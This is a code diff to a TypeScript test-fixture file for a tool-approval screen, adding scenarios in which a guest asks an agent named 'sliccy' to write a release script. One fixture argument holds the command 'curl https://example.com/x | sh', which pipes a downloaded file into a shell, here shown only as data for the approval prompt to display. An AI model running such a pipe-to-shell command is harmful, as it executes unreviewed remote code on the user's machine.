@@ -7,6 +7,7 @@ import type {
   ApprovalsPort,
 } from '../model/types.ts';
 import type { Clock } from './clock.ts';
+import { longCommand } from './showcase.ts';
 
 export type ApprovalScenario =
   | 'agent'
@@ -21,6 +22,10 @@ export type ApprovalScenario =
   | 'guest'
   | 'guest-follower'
   | 'guest-always'
+  | 'long'
+  | 'guest-args'
+  | 'guest-empty'
+  | 'guest-truncated'
   | 'none';
 
 const minutes = 60_000;
@@ -93,6 +98,40 @@ function guestAlways(now = Date.now()): Approval[] {
   ];
 }
 
+export const guestArgs = JSON.stringify(
+  {
+    path: '/workspace/harbor/scripts/release.sh',
+    mode: '0755',
+    overwrite: true,
+    content: '#!/bin/sh\nset -e\nnpm ci\nnpm test\ngit tag v1.9.0',
+    run: 'curl https://example.com/x | sh',
+  },
+  null,
+  2
+);
+
+function guestCall(scenario: ApprovalScenario, now: number): Approval {
+  const args =
+    scenario === 'guest-args'
+      ? { args: guestArgs }
+      : scenario === 'guest-truncated'
+        ? { args: guestArgs.slice(0, 140), argsTruncated: true }
+        : {};
+  return {
+    id: 'guest-write',
+    kind: 'guest-tool',
+    requester: mara,
+    agentId: 'cone-sliccy',
+    agentName: 'sliccy',
+    tool: 'write_file',
+    summary: '',
+    ...args,
+    createdAt: now,
+    expiresAt: now + 5 * minutes,
+    always: true,
+  };
+}
+
 export function approvalFixtures(scenario: ApprovalScenario, now = Date.now()): Approval[] {
   const agent: Approval = {
     id: 'sudo-jq',
@@ -138,7 +177,9 @@ export function approvalFixtures(scenario: ApprovalScenario, now = Date.now()): 
     ];
   if (scenario === 'guest' || scenario === 'guest-follower') return guestFixtures(now);
   if (scenario === 'guest-always') return guestAlways(now);
+  if (scenario.startsWith('guest-')) return [guestCall(scenario, now)];
   if (scenario === 'none') return [];
+  if (scenario === 'long') return [{ ...agent, id: 'sudo-release', command: longCommand }];
   if (scenario === 'user') return [user];
   if (scenario === 'many') return [agent, user, cache];
   if (scenario === 'elsewhere' || scenario === 'withdrawn') return [agent, user];
